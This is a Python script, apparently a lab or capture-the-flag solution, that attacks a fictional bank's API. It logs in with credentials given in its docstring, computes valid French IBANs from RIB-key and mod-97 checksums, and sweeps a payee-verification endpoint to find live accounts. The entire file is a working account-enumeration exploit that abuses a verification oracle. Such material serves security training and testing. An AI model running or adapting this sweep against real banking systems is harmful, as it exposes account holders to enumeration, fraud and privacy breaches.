# FLAG_PLACEHOLDER
#!/usr/bin/env python3
"""
Task 3 - Identifiers the Bank Will Accept
Generates candidate French IBANs within the tester's own bank/branch,
reproduces the RIB key and IBAN check-digit checksums, verifies each
candidate against the payee-verification oracle, and reports the first
account it finds live (any status other than IBAN_INVALID / non-200).

Run as delivered:
    python3 3-flag.txt --customer 20001041 --password 'Theo-Capstone-4471'
"""

import argparse
import sys
import time
import requests

BASE_URL = "http://10.42.51.233"
BANK_CODE = "19999"     # from the tester's own IBAN
BRANCH_CODE = "00777"   # from the tester's own IBAN
COUNTRY = "FR"
RATE_LIMIT_SECONDS = 0.5  # be gentle with the oracle


def rib_key(bank: str, branch: str, account: str) -> int:
    """French RIB key checksum: 97 - ((89*bank + 15*branch + 3*account) mod 97)."""
    b, br, a = int(bank), int(branch), int(account)
    return 97 - ((89 * b + 15 * br + 3 * a) % 97)


def iban_check_digits(country: str, bban: str) -> str:
    """ISO 7064 mod-97-10 IBAN check digit calculation."""
    rearranged = bban + country + "00"
    numeric = ""
    for ch in rearranged:
        if ch.isdigit():
            numeric += ch
        else:
            numeric += str(ord(ch.upper()) - 55)  # A=10 ... Z=35
    remainder = int(numeric) % 97
    return f"{98 - remainder:02d}"


def build_iban(bank: str, branch: str, account: str, country: str = COUNTRY):
    key = rib_key(bank, branch, account)
    key_str = f"{key:02d}"
    bban = bank + branch + account + key_str
    check = iban_check_digits(country, bban)
    return f"{country}{check}{bban}"


def self_test():
    """Reproduce a known-good IBAN to prove the checksum implementation is correct."""
    known_iban = "FR7619999007770000000000121"
    known_account = "00000000001"
    rebuilt = build_iban(BANK_CODE, BRANCH_CODE, known_account)
    if rebuilt != known_iban:
        print(f"[!] Self-test FAILED: {rebuilt} != {known_iban}", file=sys.stderr)
        sys.exit(1)
    print(f"[+] Self-test OK: reproduced {rebuilt}")


def login(session: requests.Session, customer_number: str, password: str) -> None:
    r = session.post(
        f"{BASE_URL}/api/v2/auth/login",
        json={"customer_number": customer_number, "password": password},
        timeout=10,
    )
    r.raise_for_status()
    if "cal_session" not in session.cookies.get_dict():
        print("[!] Login did not set cal_session cookie", file=sys.stderr)
        sys.exit(1)
    print("[+] Authenticated, session cookie acquired.")


def verify(session: requests.Session, iban: str):
    r = session.post(
        f"{BASE_URL}/api/v2/beneficiaries/verify",
        json={"iban": iban},
        timeout=10,
    )
    try:
        body = r.json()
    except ValueError:
        body = {}
    return r.status_code, body


def sweep(session: requests.Session, account_start: int, account_end: int):
    for account_int in range(account_start, account_end + 1):
        account = f"{account_int:011d}"
        iban = build_iban(BANK_CODE, BRANCH_CODE, account)
        status_code, body = verify(session, iban)
        status = body.get("status", "?")

        if status_code == 200 and status == "MATCH":
            print(f"[FOUND] {iban} -> {body}")
            return iban, body
        elif status_code == 200:
            print(f"[live but no match] {iban} -> {body}")
        elif status == "IBAN_INVALID":
            pass  # checksum-invalid candidate, expected majority, stay quiet
        else:
            print(f"[unexpected] {iban} -> {status_code} {body}")

        time.sleep(RATE_LIMIT_SECONDS)

    return None, None


def main():
    parser = argparse.ArgumentParser(description="Calderis IBAN generator/sweeper")
    parser.add_argument("--customer", required=True, help="customer_number")
    parser.add_argument("--password", required=True, help="account password")
    parser.add_argument("--start", type=int, default=1, help="account number range start")
    parser.add_argument("--end", type=int, default=50, help="account number range end (bounded sweep)")
    args = parser.parse_args()

    self_test()

    session = requests.Session()
    login(session, args.customer, args.password)

    print(f"[+] Sweeping accounts {args.start:011d}..{args.end:011d} "
          f"under bank {BANK_CODE} / branch {BRANCH_CODE} "
          f"(rate limit {RATE_LIMIT_SECONDS}s/req)")

    iban, body = sweep(session, args.start, args.end)

    if iban:
        print(f"\n[+] Live account located: {iban}")
        print(f"[+] Verification response: {body}")
    else:
        print("\n[-] No live account found in the given range. Widen --start/--end and retry.")


if __name__ == "__main__":
    main()
